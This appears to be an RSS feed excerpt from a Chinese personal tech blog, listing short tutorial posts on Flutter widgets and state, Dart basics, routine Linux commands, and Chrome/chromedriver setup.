      <description>1.使用 spaceBetween 对齐方式 new Row( mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [ new Text(&amp;#34;left&amp;#34;), new Text(&amp;#34;right&amp;#34;) ] ); 2.中间使用 Expanded 自动扩展 Row( children: &amp;lt;Widget&amp;gt;[ FlutterLogo(),//左对齐  Expanded(child: SizedBox()),//自动扩展挤压  FlutterLogo(),//右对齐  ], ); 3.使用 Spacer 自动填充 Row( children: &amp;lt;Widget&amp;gt;[ FlutterLogo(), Spacer(), FlutterLogo(), ], ); 4.使用 Flexible Row( children: &amp;lt;Widget&amp;gt;[ FlutterLogo(), Flexible(fit: FlexFit.tight, child: SizedBox()), FlutterLogo(), ], ); </description>
    </item>
    
    <item>
      <title>Linux(19)——常用的命令</title>
      <link>https://ac-lm.github.io/posts/linux/linux19%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Sun, 16 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux19%E5%B8%B8%E7%94%A8%E7%9A%84%E5%91%BD%E4%BB%A4/</guid>
      <description>1.历史记录命令 history -c # 参数!n（n命令编号），执行第n个命令 # 参数!$ / !!（上一个命令），执行上一条命令， # 参数-c（清理），清理历史记录 2.文件查看命令 ls #查看当前全部文件 ll #以详细信息列出文件 #------------------------------------------------ -a #显示所有文件及目录 (. 开头的隐藏文件也会列出) -l #除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出 -r #将文件以相反次序显示(原定依英文字母次序) -t #将文件依建立时间之先后次序列出 -A #同 -a ，但不列出 &amp;#34;.&amp;#34; (目前目录) 及 &amp;#34;..&amp;#34; (父目录) -F #在列出的文件名称后加一符号；例如可执行档则加 &amp;#34;*&amp;#34;, 目录则加 &amp;#34;/&amp;#34; -R #若目录下有文件，则以下之文件亦皆依序列出 3.文件夹操作命令 cd .. #进入父文件夹 cd ~ #root cd / #根 rm -rf xxxx #删除 vi test.txt #编辑 vim test.txt #编辑 chmod 4755 filename #Root权限 chmod -R 4755 filename #对全部文件加权限 chown root KI.</description>
    </item>
    
    <item>
      <title>Flutter(14)——滚动视图的位置保存</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter14%E6%BB%9A%E5%8A%A8%E8%A7%86%E5%9B%BE%E7%9A%84%E4%BD%8D%E7%BD%AE%E4%BF%9D%E5%AD%98/</link>
      <pubDate>Sat, 15 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter14%E6%BB%9A%E5%8A%A8%E8%A7%86%E5%9B%BE%E7%9A%84%E4%BD%8D%E7%BD%AE%E4%BF%9D%E5%AD%98/</guid>
      <description>参考原文：how-to-get-flutter-scrollcontroller-to-save @stackoverflow 
 使用 AutomaticKeepAliveClientMixin 保存状态 class GetListView extends StatefulWidget{ @override State&amp;lt;StatefulWidget&amp;gt; createState() =&amp;gt;_GetListViewState(); } class _GetListViewState extends State&amp;lt;GetListView&amp;gt; with AutomaticKeepAliveClientMixin&amp;lt;GetListView&amp;gt;{ @override Widget build(BuildContext context){ return ListView.builder( itemCount: 2000, itemBuilder: (context, i) { return ListTile( title: Text( i.toString(), textScaleFactor: 1.5, style: TextStyle(color: Colors.blue), )); }); } @override bool get wantKeepAlive =&amp;gt; true; } 使用 PageStorageKey 保存偏移 ListView.builder( key: PageStorageKey&amp;lt;String&amp;gt;(&amp;#39;controllerA&amp;#39;), controller: ScrollController(keepScrollOffset: true), itemCount: 2000, itemBuilder: (context, i) { print(&amp;#34;Rebuilded 1&amp;#34;); return ListTile( title: Text( i.</description>
    </item>
    
    <item>
      <title>Linux(18)——Chrome 的安装配置</title>
      <link>https://ac-lm.github.io/posts/linux/linux18chrome-%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Sat, 15 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux18chrome-%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/</guid>
      <description>1.Chrome 安装 # 下载------------------------------------------- wget https://dl.google.com/linux/direct/google-chrome-stable_current_x86_64.rpm # 安装依赖------------------------------------------------------------- yum install libX11 libXcursor libXdamage libXext libXcomposite libXi libXrandr gtk3 libappindicator-gtk3 xdg-utils libXScrnSaver liberation-fonts # 执行安装-------------------------------------------------------------------- rpm -ivh google-chrome-stable_current_x86_64.rpm # 检验版本 google-chrome --version 2.chromedriver配置使用 # 前往 https://npm.taobao.org/mirrors/chromedriver/ 下载对应的 WebDriver # 建议将 WebDriver 上传到路径 /usr/local/bin 以添加到环境中，这样在编写脚本时不需要指定路径 # 参数配置---------------------------------------------------------- class webs(unittest.TestCase): def setUp(self): options = ChromeOptions() options.add_argument(&amp;#39;--no-sandbox&amp;#39;) # 不在沙盒运行，以Root权限运行 options.add_argument(&amp;#39;--headless&amp;#39;) # 必须添加这两个参数，否则会出现权限不够的问题 self.browser = Chrome(options=options) # WebDriver已添加到环境中 </description>
    </item>
    
    <item>
      <title>Flutter(13)——真机添加网络权限</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter13%E7%9C%9F%E6%9C%BA%E6%B7%BB%E5%8A%A0%E7%BD%91%E7%BB%9C%E6%9D%83%E9%99%90/</link>
      <pubDate>Fri, 14 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter13%E7%9C%9F%E6%9C%BA%E6%B7%BB%E5%8A%A0%E7%BD%91%E7%BB%9C%E6%9D%83%E9%99%90/</guid>
      <description>1.网络权限 在 AndroidManifest.xml 中添加下列代码，注意不要放到 application 中.
// android/app/src/main/AndroidManifest.xml &amp;lt;uses-permission android:name=&amp;#34;android.permission.READ_PHONE_STATE&amp;#34; /&amp;gt; &amp;lt;uses-permission android:name=&amp;#34;android.permission.INTERNET&amp;#34; /&amp;gt; &amp;lt;uses-permission android:name=&amp;#34;android.permission.ACCESS_NETWORK_STATE&amp;#34; /&amp;gt; &amp;lt;uses-permission android:name=&amp;#34;android.permission.ACCESS_WIFI_STATE&amp;#34; /&amp;gt; </description>
    </item>
    
    <item>
      <title>Linux(17)——Linux 常识</title>
      <link>https://ac-lm.github.io/posts/linux/linux17linux-%E5%B8%B8%E8%AF%86/</link>
      <pubDate>Fri, 14 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux17linux-%E5%B8%B8%E8%AF%86/</guid>
      <description>1.解释下什么是GPL,GNU,自由软件？ GPL：（通用公共许可证）：一种授权，任何人有权取得、修改、重新发布自由软件的权力。GNU:(革奴计划)：目标是创建一套完全自由、开放的的操作系统。自由软件：是一种可以不受限制地自由使用、复制、研究、修改和分发的软件。主要许可证有GPL和BSD许可证两种。2.linux系统里，buffer和cache如何区分？ buffer和cache都是内存中的一块区域，当CPU需要写数据到磁盘时，由于磁盘速度比较慢，所以CPU先把数据存进buffer，然后CPU去执行其他任务，buffer中的数据会定期写入磁盘；当CPU需要从磁盘读入数据时，由于磁盘速度比较慢，可以把即将用到的数据提前存入cache，CPU直接从Cache中拿数据要快的多。3.描述Linux运行级别0-6的各自含义 0：关机模式1：单用户模式&amp;lt;==破解root密码2：无网络支持的多用户模式3：有网络支持的多用户模式（文本模式，工作中最常用的模式）4：保留，未使用5：有网络支持的X-windows支持多用户模式（桌面）6: 重新引导系统，即重启4.描述Linux系统从开机到登陆界面的启动过程 ⑴开机BIOS自检，加载硬盘。⑵读取MBR,MBR引导。⑶grub引导菜单(Boot Loader)。⑷加载内核kernel。⑸启动init进程，依据inittab文件设定运行级别⑹init进程，执行rc.sysinit文件。⑺启动内核模块，执行不同级别的脚本程序。⑻执行/etc/rc.d/rc.local⑼启动mingetty，进入系统登陆界面。5.描述Linux下软链接和硬链接的区别 在Linux系统中，链接分为两种，一种是硬链接（Hard link），另一种称为符号链接或软链接（Symbolic Link）。①默认不带参数的情况下，ln创建的是硬链接，带-s参数的ln命令创建的是软链接。②硬链接文件与源文件的inode节点号相同，而软链接文件的inode节点号，与源文件不同，③ln命令不能对目录创建硬链接，但可以创建软链接。对目录的软链接会经常使用到。④删除软链接文件，对源文件和硬链接文件无任何影响。⑤删除文件的硬链接文件，对源文件及软链接文件无任何影响。⑥删除链接文件的源文件，对硬链接文件无影响，会导致其软链接失效（红底白字闪烁状）。⑦同时删除源文件及其硬链接文件，整个文件才会被真正的删除。⑧很多硬件设备的快照功能，使用的就是类似硬链接的原理。⑨软链接可以跨文件系统，硬链接不可以跨文件系统。6.shell脚本中“$?”标记的用途是什么? 在写一个shell脚本时，如果你想要检查前一命令是否执行成功，在if条件中使用“$?”可以来检查前一命令的结束状态。简单的例子如下：root@localhost:~# ls /usr/bin/root@localhost:~# echo $?0如果结束状态是0，说明前一个命令执行成功。root@localhost:~# ls /usr/bin/sharels: cannot access /usr/bin/share: No such file or directoryroot@localhost:~# echo $?2如果结束状态不是0，说明命令执行失败。7.</description>
    </item>
    
    <item>
      <title>Flutter(12)——关闭界面</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter12%E5%85%B3%E9%97%AD%E7%95%8C%E9%9D%A2/</link>
      <pubDate>Thu, 13 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter12%E5%85%B3%E9%97%AD%E7%95%8C%E9%9D%A2/</guid>
      <description>1.POP 通过将将当前界面 pop 出来关闭界面
Navigator.pop(context);Navigator.of(context).pop();</description>
    </item>
    
    <item>
      <title>Linux(16)——后台程序的运行及关闭</title>
      <link>https://ac-lm.github.io/posts/linux/linux16%E5%90%8E%E5%8F%B0%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%BF%90%E8%A1%8C%E5%8F%8A%E5%85%B3%E9%97%AD/</link>
      <pubDate>Thu, 13 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux16%E5%90%8E%E5%8F%B0%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%BF%90%E8%A1%8C%E5%8F%8A%E5%85%B3%E9%97%AD/</guid>
      <description>1.实现后台执行程序 #后台执行程序 nohup python test.py &amp;gt; run.log 2&amp;gt;&amp;amp;1 &amp;amp; #查看后台程序 ps aux |grep &amp;#34;test.sh&amp;#34; # a:显示所有程序 u:以用户为主的格式来显示 x:显示所有程序，不以终端机来区分 ps -ef |grep &amp;#34;test.sh&amp;#34; # -e显示所有进程。-f全格式。 # 关闭后台程序kill 1001 kill -9 1001 #-9表示强制关闭 # 根据名称删除 pkill -f Chrome # kill 对应的是 PID # pkill 对应的是COMMAND 2.linux后台运行命令nohup和&amp;amp;的区别  &amp;amp;：表示程序在后台运行，当执行./a.out &amp;amp; 的时候，即使你使用ctrl+C，a.out照样运行（因为对SIGINT信号免疫）。但是要注意，如果你直接关掉shell，那么，a.out进程会停止关闭。可见，&amp;amp;的后台并不硬（因为对SIGHUP信号不免疫）。 nohup：表示的是忽略SIGHUP信号，所以当运行nohup ./a.out时，关闭shell，a.out还是在运行（对SIGHUP信号免疫）。但是，如果直接在shell中使用Ctrl+C，那么，a.out进程会停止关闭（因为对SIGINT信号不免疫）  所以， &amp;amp;和nohup两者并没有直接关系， 要让进程真正不受shell中Ctrl+C和shell关闭的影响，最好是使用命令 nohua ./a.out &amp;amp;</description>
    </item>
    
    <item>
      <title>Flutter(11)——setState更新原理和流程</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter11setstate-%E6%9B%B4%E6%96%B0%E5%8E%9F%E7%90%86%E5%92%8C%E6%B5%81%E7%A8%8B/</link>
      <pubDate>Wed, 12 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter11setstate-%E6%9B%B4%E6%96%B0%E5%8E%9F%E7%90%86%E5%92%8C%E6%B5%81%E7%A8%8B/</guid>
      <description>参考原文：Flutter的setState更新原理和流程 @flutter开发精选 
 1.Flutter 的状态类  StatelessWidget：无状态类，没有状态更新，界面一经创建无法更改 StatefulWidget：有状态类，当状态改变，调用 setState() 方法会触发 StatefulWidget 的 UI 状态更新，自定义继承 StatefulWidget 的子类须重写 createState() 方法  2.mounted 调用 setState() 必须是没有调用过 dispose() 方法，不然出错，可通过 mounted 属性来判断调用此方法是否合法。
if (mounted) {setState(() {});}3.流程 a.条件判断  1.生命周期判断 2.是否可以进行刷新：mounted  b.添加脏链表 _dirty = true  1.“脏”链表是待更新的链表 2.更新过后就不“脏”了 3._active=false 的时候直接返回  c.管理类  告诉管理类方法自己需要被重新构建 owner.scheduleBuildFor(this)  d.调用 window.scheduleFrame() =&amp;gt;native 方法  RegisterNatives() 完成 native 方法的注册 最终会注册 vsync 回调。 等待下一次 vsync 信号的到来， 然后再经过层层调用最终会调用到 Window::BeginFrame() UI 的绘制逻辑是在 Render 树中实现的  e.</description>
    </item>
    
    <item>
      <title>Flutter(10)——读取 app 安装包资源</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter10%E8%AF%BB%E5%8F%96-app-%E5%AE%89%E8%A3%85%E5%8C%85%E8%B5%84%E6%BA%90/</link>
      <pubDate>Tue, 11 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter10%E8%AF%BB%E5%8F%96-app-%E5%AE%89%E8%A3%85%E5%8C%85%E8%B5%84%E6%BA%90/</guid>
      <description>参考原文：Flutter 读取应用资源并显示 @飘香豆腐 
 1.资源加载 在 flutter 中，如果需要加载资源的话，需要在 pubspec.yaml 指定 APP 所需要的资源。这样的话，指定的每个 Asset （资源）都会被打包在 APP 中，并且在 APP 运行时可以访问到这些资源。
最常见的 Asset 类型就是图片，指定图片资源后即可以在 APP 页面使用图片控件加载资源了。
# pubspec.yaml flutter: assets: - assets/images/logo.png // lib/main.dart Image.asset(&amp;#39;assets/images/logo.png&amp;#39;) 2.使用 rootBundle 对象访问资源 APP 还可以通过引入 services 包使用 rootBundle 对象来访问资源。
import &amp;#39;package:flutter/services.dart&amp;#39;; 比如访问文件 test.txt，txt 文件内容是 测试文字，可以使用 rootBundle 对象的 loadString 方法。当然，前提也是需要在 pubspec.yaml 中指定资源才能访问的到。
rootBundle.loadString(&amp;#39;assets/txt/test.txt&amp;#39;).then((data){ print(data); }); // 测试文字 因为 loadString() 返回的是 Future，所以需要用 then() 接受返回的 String 类型的数据。Future 类似于 ES6 中的 Promise，当异步任务执行完成后会把结果返回给 then()。</description>
    </item>
    
    <item>
      <title>Flutter(9)——主题颜色</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter9%E4%B8%BB%E9%A2%98%E9%A2%9C%E8%89%B2/</link>
      <pubDate>Mon, 10 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter9%E4%B8%BB%E9%A2%98%E9%A2%9C%E8%89%B2/</guid>
      <description>1.primarySwatch flutter 的主题（build下面的theme）中有个主题颜色（primarySwatch），该主题颜色(primarySwatch)只有以下的几个值可以选择，其他的暂不支持:
red,pink,purple,deepPurple,indigo,blue,lightBlue,cyan,teal,green,lightGreen,lime,yellow,amber,orange,deepOrange,brown,blueGrey,2.primaryColor 如果要把顶部导航栏和状态栏的颜色修改成黑色或者白色，需要用到这个属性。
primaryColor:Colors.white</description>
    </item>
    
    <item>
      <title>Dart(7)——异步</title>
      <link>https://ac-lm.github.io/posts/dart/dart7%E5%BC%82%E6%AD%A5/</link>
      <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/dart/dart7%E5%BC%82%E6%AD%A5/</guid>
      <description>Dart - 单线程语言 Dart 是一个单线程编程语言。如果任何代码阻塞线程执行都会导致程序卡死。为了避免此类情况出现，Dart 使用 Future 对象表示异步操作。
// Synchronous code printDailyNewsDigest() { String news = gatherNewsReports(); // Can take a while.  print(news); } main() { printDailyNewsDigest(); printWinningLotteryNumbers(); printWeatherForecast(); printBaseballScore(); } 在上述示例代码中，存在一个问题函数 printDailyNewsDigest，该函数是阻塞的，在这之后的代码都必须等待 printDailyNewsDigest 结束才能继续执行。因此为了程序能及时响应，Dart 的作者使用异步编程模型 Future 处理可能耗时的函数。
什么是 Future Future 表示在将来某时获取一个值的方式。当一个返回 Future 的函数被调用的时候，程序做了两件事情：
 函数把自己放入队列和返回一个未完成的 Future 对象 当值可用时，Future 带着值变成完成状态。  async 和 await async 和 await 关键字是 Dart 异步支持的一部分。他们允许你像写同步代码一样写异步代码和不需要使用 Future 接口。
import &amp;#39;dart:async&amp;#39;; printDailyNewsDigest() async { String news = await gatherNewsReports(); print(news); } main() { printDailyNewsDigest(); printWinningLotteryNumbers(); printWeatherForecast(); printBaseballScore(); } 如上述示例代码，在这时 printDailyNewsDigest 虽然是第一个调用的，但是最后打印的。这是因为代码读取和打印内容是异步执行的。</description>
    </item>
    
    <item>
      <title>Flutter(8)——为BottomNavigationBar设置背景色</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter8%E4%B8%BA-bottomnavigationbar-%E8%AE%BE%E7%BD%AE%E8%83%8C%E6%99%AF%E8%89%B2/</link>
      <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter8%E4%B8%BA-bottomnavigationbar-%E8%AE%BE%E7%BD%AE%E8%83%8C%E6%99%AF%E8%89%B2/</guid>
      <description>BottomNavigationBar BottomNavigationBar 不能直接设置背景色，但是可以通过设置主题画布色达到相同的效果
bottomNavigationBar: new Theme( data: Theme.of(context).copyWith( //设置背景色`BottomNavigationBar`  canvasColor: Colors.green, //设置高亮文字颜色  primaryColor: Colors.red, //设置一般文字颜色  textTheme: Theme.of(context).textTheme.copyWith(caption: new TextStyle(color: Colors.yellow))), child: new BottomNavigationBar( type: BottomNavigationBarType.fixed, currentIndex: 0, items: [ new BottomNavigationBarItem( icon: new Icon(Icons.add), title: new Text(&amp;#34;新增&amp;#34;), ), new BottomNavigationBarItem( icon: new Icon(Icons.delete), title: new Text(&amp;#34;删除&amp;#34;), ) ], ), ), </description>
    </item>
    
    <item>
      <title>Linux(15)——tar解压</title>
      <link>https://ac-lm.github.io/posts/linux/linux15tar-%E8%A7%A3%E5%8E%8B/</link>
      <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux15tar-%E8%A7%A3%E5%8E%8B/</guid>
      <description>tar 命令可以为 linux 的文件和目录创建档案。利用 tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。
1.打包和压缩  打包是指将一大堆文件或目录变成一个总的文件 压缩则是将一个大的文件通过一些压缩算法变成一个小文件  为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar 命令），然后再用压缩程序进行压缩（gzip bzip2 命令）。
yum install tar gzip bzip2.使用 tar 解包：tar xvf FileName.tar打包：tar cvf FileName.tar DirName.gz解压1：gunzip FileName.gz解压2：gzip -d FileName.gz压缩：gzip FileName.tar.gz 和 .tgz解压：tar zxvf FileName.tar.gz压缩：tar zcvf FileName.tar.gz DirName.bz2解压1：bzip2 -d FileName.bz2解压2：bunzip2 FileName.bz2压缩： bzip2 -z FileName.tar.bz2 .tar.xz解压：tar jxvf FileName.tar.bz2压缩：tar jcvf FileName.tar.bz2 DirName.bz解压1：bzip2 -d FileName.bz解压2：bunzip2 FileName.</description>
    </item>
    
    <item>
      <title>随记(25)——罗技M170拆解</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B025%E7%BD%97%E6%8A%80-m170-%E6%8B%86%E8%A7%A3/</link>
      <pubDate>Fri, 30 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B025%E7%BD%97%E6%8A%80-m170-%E6%8B%86%E8%A7%A3/</guid>
      <description>参考原文：如何拆解罗技M170鼠标？ @WXLJJ 
 打开后盖，如图所示，有三个卡扣。</description>
    </item>
    
    <item>
      <title>Dart(6)——函数形参</title>
      <link>https://ac-lm.github.io/posts/dart/dart6%E5%87%BD%E6%95%B0%E5%BD%A2%E5%8F%82/</link>
      <pubDate>Thu, 29 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/dart/dart6%E5%87%BD%E6%95%B0%E5%BD%A2%E5%8F%82/</guid>
      <description>1.示例 int add(int a, int b) { return a + b; } int test(int a, int b, Function operation) { return operation(a, b); } main() { print(test(5, 2, add)); } 2.注意  方法当做参数传递的时候，只需要传递方法名即可，不需要带上方法的括号。 方法作为参数的时候传递给其他方法的时候，不会立即执行。 方法当做参数传递的时候，方法名表示该方法的引用，这个引用当做参数传递的时候不会立即执行，只会在调用的时候执行。 入参方法在被实际调用时，会添加括号，当做正常的方法调用。  </description>
    </item>
    
    <item>
      <title>Flutter(7)——加载动画</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter7%E5%8A%A0%E8%BD%BD%E5%8A%A8%E7%94%BB/</link>
      <pubDate>Thu, 29 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter7%E5%8A%A0%E8%BD%BD%E5%8A%A8%E7%94%BB/</guid>
      <description>参考原文：Flutter做一个加载动画 @limhGeek 
 1.根据情况返回不同布局 在加载的时候返回加载的布局，不加载的时候返回登陆页面布局，_childLayout()方法
import &amp;#39;package:flutter/material.dart&amp;#39;; import &amp;#39;package:flutter_loading/Toast.dart&amp;#39;; void main() =&amp;gt; runApp(MyApp()); class MyApp extends StatelessWidget { ......... } class MyHomePage extends StatefulWidget { ......... } class _MyHomePageState extends State&amp;lt;MyHomePage&amp;gt; { bool _loading = false; //标志！是否加载状态  @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( title: Text(widget.title), ), body: _childLayout(), ); } Widget _childLayout() { if (_loading) { return Center( child: Container( child: CircularProgressIndicator(), ), ); } else { return Center( child: RaisedButton( onPressed: () { _loading = !</description>
    </item>
    
    <item>
      <title>Linux(14)——系统监控命令</title>
      <link>https://ac-lm.github.io/posts/linux/linux14%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7%E5%91%BD%E4%BB%A4/</link>
      <pubDate>Thu, 29 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux14%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7%E5%91%BD%E4%BB%A4/</guid>
      <description>1.top – 进程活动监控命令 top 命令会显示 Linux 的进程。它提供了一个运行中系统的实时动态视图，即实际的进程活动。默认情况下，它显示在服务器上运行的 CPU 占用率最高的任务，并且每五秒更新一次。
t	是否显示汇总信息m	是否显示内存信息A	根据各种系统资源的利用率对进程进行排序，有助于快速识别系统中性能不佳的任务。f	进入 top 的交互式配置屏幕，用于根据特定的需求而设置 top 的显示。o	交互式地调整 top 每一列的顺序。r	调整优先级（renice）k	杀掉进程（kill）z	切换彩色或黑白模式2.w – 找出登录用户 w 命令 显示了当前登录在该系统上的用户及其进程。
# w username# w vivek3.uptime – 系统运行时间 uptime 命令可以用来查看服务器运行了多长时间：当前时间、已运行的时间、当前登录的用户连接数，以及过去 1 分钟、5 分钟和 15 分钟的系统负载平均值，1 可以被认为是最佳负载值。
4.ps – 显示系统进程 ps 命令显示当前运行的进程。
# ps -A |显示所有的进程# ps -Al |显示长输出格式# ps -AlF |显示完整输出格式（它将显示传递给进程的命令行参数）# ps -AlFH |显示线程（轻量级进程（LWP）和线程的数量（NLWP））# ps -AlLm |在进程后显示线程# ps ax# ps axu |显示系统上所有的进程# pstree |显示进程树# ps -U vivek -u vivek u |显示指定用户（如 vivek）运行的进程# # ps -C lighttpd -o pid= |显示某进程（如 lighttpd）的 PID# ps -p 55977 -o comm= |显示指定 PID（如 55977）的进程名称# ps -auxf | sort -nr -k 4 | head -10 |找出占用内存资源最多的前10个进程# ps -auxf | sort -nr -k 3 | head -10 |找出占用CPU资源最多的前10个进程5.</description>
    </item>
    
    <item>
      <title>随记(24)——音视频开发</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B024%E9%9F%B3%E8%A7%86%E9%A2%91%E5%BC%80%E5%8F%91/</link>
      <pubDate>Thu, 29 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B024%E9%9F%B3%E8%A7%86%E9%A2%91%E5%BC%80%E5%8F%91/</guid>
      <description>参考原文：从开发小白到音视频专家 @卢俊 
 音视频开发，就是要掌握图像、音频、视频的基础知识，并且学会如何对它们进行采集、渲染、处理、传输等一系列的开发和应用。
 采集：它解决的是，数据从哪里来的问题 渲染：它解决的是，数据怎么展现的问题 处理：它解决的是，数据怎么加工的问题 传输：它解决的是，数据怎么共享的问题  每一个门类，都可以深挖，衍生出一个又一个充满技术挑战的话题，比如：如何更高效地渲染画面、如何提高音视频的压缩比，如何优化弱网下的音视频数据传输等等。
1.采集 采集，它解决的是，数据从哪里来的问题，那么，数据究竟从哪里来的呢 ？
其实无论在哪个平台，图像、视频最初都是来自摄像头，而音频最初都是来自麦克风，因此，做音视频采集，就要掌握如下的技术知识：
 系统的摄像头采集接口是什么，怎么用？比如：Windows：DirectShow，Linux：V4L2，Android：Camera，iOS：AVCaptureSession 系统的摄像头采集的参数怎么配置，都是什么含义 ？比如：分辨率、帧率、预览方向、对焦、闪光灯 等 系统的摄像头输出的图像/视频数据，是什么格式，不同格式有什么区别 ？比如：图片：JPEG；视频数据：NV21，NV12，I420 等 系统的麦克风采集接口是什么，怎么用 ？比如：Windows：DirectShow，Linux：ALSA &amp;amp; OSS，Android：AudioRecord，iOS：Audio Unit 系统的麦克风采集参数怎么配置，都是什么含义 ？比如：采样率、通道号、位宽等 系统的麦克风输出的音频数据，是什么格式？比如：PCM  2.渲染 渲染，它解决的是，数据怎么展现的问题，那么，数据究竟怎么展现呢 ？
其实无论在哪个平台，图像、视频最终都是要绘制到视图上面，而音频最终都是要输出到扬声器，因此，做音视频渲染，就要掌握如下的技术知识：
 系统提供了哪些 API 可以绘制一张图片或者一帧 YUV 图像数据的 ？比如：Windows：DirectDraw, Direct3D, GDI，OpenGL 等，Linux： GDI， OpenGL 等，Android：ImageView，SurfaceView，TextureView，OpenGL 等，iOS： CoreGraphics，OpenGL 等 系统提供了哪些 API 可以播放一个 mp3 或者 pcm 数据 ？比如：Windows：DirectSound 等，Linux：ALSA &amp;amp; OSS 等，Android：AudioTrack 等，iOS： AudioQueue 等  3.</description>
    </item>
    
    <item>
      <title>Dart(5)——字典</title>
      <link>https://ac-lm.github.io/posts/dart/dart5%E5%AD%97%E5%85%B8/</link>
      <pubDate>Wed, 28 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/dart/dart5%E5%AD%97%E5%85%B8/</guid>
      <description>1.声明 a.不指定泛型 //直接赋值  var map1 = {&amp;#39;aa&amp;#39;:&amp;#39;aaa&amp;#39;,&amp;#39;bb&amp;#39;:22,&amp;#39;cc&amp;#39;:true}; Map map2 = {&amp;#39;a&amp;#39;:&amp;#39;a1&amp;#39;,&amp;#39;b&amp;#39;:&amp;#39;b1&amp;#39;}; //间接赋值  var map3 = new Map(); map3[&amp;#39;aa&amp;#39;] = &amp;#39;aaa&amp;#39;; Map map4 = new Map(); map4[&amp;#39;a&amp;#39;] = &amp;#39;aaa&amp;#39;; b.指定泛型 //直接赋值  var map1 = &amp;lt;String,String&amp;gt;{&amp;#39;aa&amp;#39;:&amp;#39;aaa&amp;#39;,&amp;#39;bb&amp;#39;:&amp;#39;22&amp;#39;,&amp;#39;cc&amp;#39;:&amp;#39;333&amp;#39;}; Map map2 = &amp;lt;String,String&amp;gt;{&amp;#39;a&amp;#39;:&amp;#39;a1&amp;#39;,&amp;#39;b&amp;#39;:&amp;#39;b1&amp;#39;,&amp;#39;c&amp;#39;:&amp;#39;c1&amp;#39;}; //间接赋值  var map3 = new Map&amp;lt;String,String&amp;gt;(); map3[&amp;#39;aa&amp;#39;] = &amp;#39;aaa&amp;#39;; Map map4 = new Map&amp;lt;String,String&amp;gt;(); map4[&amp;#39;a&amp;#39;] = &amp;#39;a1&amp;#39;; c.复制 // 不使用类型操作符,从另一个map中初始化新的map，此时新的map中含有另一个map中的资源  Map map1 = {&amp;#39;a&amp;#39;:&amp;#39;a1&amp;#39;,&amp;#39;b&amp;#39;:&amp;#39;b1&amp;#39;,&amp;#39;c&amp;#39;:&amp;#39;c1&amp;#39;}; Map map2 = Map.</description>
    </item>
    
    <item>
      <title>Flutter(6)—setState 生命循环</title>
      <link>https://ac-lm.github.io/posts/flutter/flutter6setstate-%E7%94%9F%E5%91%BD%E5%BE%AA%E7%8E%AF/</link>
      <pubDate>Wed, 28 Apr 2021 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/flutter/flutter6setstate-%E7%94%9F%E5%91%BD%E5%BE%AA%E7%8E%AF/</guid>
      <description> 参考原文：setState() called after dispose() @Songzh
